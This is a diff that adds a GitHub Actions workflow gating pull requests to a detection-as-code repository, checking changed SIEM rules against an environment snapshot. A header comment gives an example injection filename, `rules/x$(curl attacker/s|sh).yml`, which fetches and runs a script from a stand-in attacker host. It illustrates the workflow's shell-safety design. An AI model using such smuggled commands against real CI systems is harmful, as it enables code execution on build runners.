@@ -1,0 +1,120 @@
+# Put this at .github/workflows/detection-gate.yml in a detection-as-code repo.
+#
+# It runs on pull requests and asks one question: does this change add or break
+# a rule that cannot fire in the environment it is being shipped to?
+#
+# It never talks to the SIEM. It reads snapshot.json, which the scheduled
+# workflow next door refreshes. That separation is deliberate: a pull request
+# from a fork runs untrusted code, and that runner must never hold production
+# SIEM credentials.
+#
+# Nothing in this job puts a contributor-controlled string into a shell word.
+# The file list goes from git to a file to --rules-from, NUL-separated, and is
+# never expanded by the shell: a pull request can add a file called
+# `rules/x$(curl attacker/s|sh).yml`, and on a pull_request trigger a fork can
+# do it.
+
+name: detection gate
+
+on:
+  pull_request:
+    paths:
+      - "rules/**.yml"
+      - "rules/**.yaml"
+
+permissions:
+  contents: read
+  # Needed to upload SARIF so findings appear on the changed lines themselves.
+  security-events: write
+
+# One run per pull request. A second push supersedes the first rather than
+# racing it onto the same security tab.
+concurrency:
+  group: detection-gate-${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+  gate:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5.1.0
+        with:
+          # Two commits is enough to diff against the base of the pull request.
+          fetch-depth: 0
+          # This job checks out a contributor's branch. Leaving the token in
+          # .git/config leaves it readable by anything the job runs.
+          persist-credentials: false
+
+      - uses: actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v5.6.0
+        with:
+          python-version: "3.12"
+
+      # Pinned, because an unpinned gate changes its own verdicts on a day
+      # nobody touched the rules. The PyPI name is not claimed yet, so this
+      # installs from the repository; switch to
+      # `pip install "detection-gate==0.1.0"` once it is published.
+      - run: pip install "detection-gate @ git+https://github.com/dipsh0v/detection-gate@v0.1.0"
+
+      - name: collect the rules this change touched
+        id: changed
+        env:
+          BASE_REF: ${{ github.base_ref }}
+        run: |
+          # Scanning only what changed is what keeps this job in seconds
+          # rather than minutes. Deleted files are excluded: a rule that is
+          # gone cannot fail a check.
+          #
+          # -z writes NUL-separated names, which is the only form that
+          # survives a filename containing a space, a quote or a newline.
+          git diff -z --name-only --diff-filter=d \
+            "origin/${BASE_REF}...HEAD" -- 'rules/**.yml' 'rules/**.yaml' > changed.txt
+          count="$(tr -cd '\0' < changed.txt | wc -c)"
+          echo "count=${count}" >> "$GITHUB_OUTPUT"
+          tr '\0' '\n' < changed.txt
+
+      - name: detection gate
+        if: steps.changed.outputs.count != '0'
+        run: |
+          # --fail-on-new is what makes this a gate rather than a report. The
+          # baseline carries the failures the team has already accepted, so a
+          # pull request goes red only for what it made worse.
+          #
+          # --base-dir keeps the SARIF locations relative to the repository, so
+          # code scanning can place them on a line and the runner's directory
+          # layout stays off the security tab.
+          detection-gate scan \
+            --rules-from changed.txt \
+            --base-dir "${GITHUB_WORKSPACE}" \
+            --snapshot-file .detections/snapshot.json \
+            --baseline .detections/baseline.json \
+            --ingest-pipeline .detections/ingest-pipeline.yml \
+            --config .detections/sysmon-config.xml \
+            --reference-config .detections/sysmon-reference.xml \
+            --sarif-out results.sarif \
+            --fail-on-new
+
+      - name: annotate the changed rules
+        # Runs even when the gate failed: the whole point is to show the author
+        # which rule broke and why, on the line they are looking at.
+        if: always() && steps.changed.outputs.count != '0' && hashFiles('results.sarif') != ''
+        uses: github/codeql-action/upload-sarif@ce5e7eeac396d720fe2d802714996c8ce561e311 # v3.39.0
+        with:
+          sarif_file: results.sarif
+          category: detection-gate
+
+      - name: how old is the snapshot
+        if: always()
+        run: |
+          # A gate judging a change against a stale picture of the environment
+          # is worse than no gate, because it is confidently out of date. Say
+          # the age out loud on every run.
+          python - <<'PY'
+          import json, time, pathlib
+          snap = json.loads(pathlib.Path(".detections/snapshot.json").read_text())
+          age_h = (time.time() - float(snap["taken_at"])) / 3600
+          print(f"::notice::schema snapshot is {age_h:.1f} hours old "
+                f"(index {snap.get('index_pattern')}, window {snap.get('window')})")
+          if age_h > 72:
+              print("::warning::snapshot older than 72h; the scheduled refresh may be failing")
+          PY
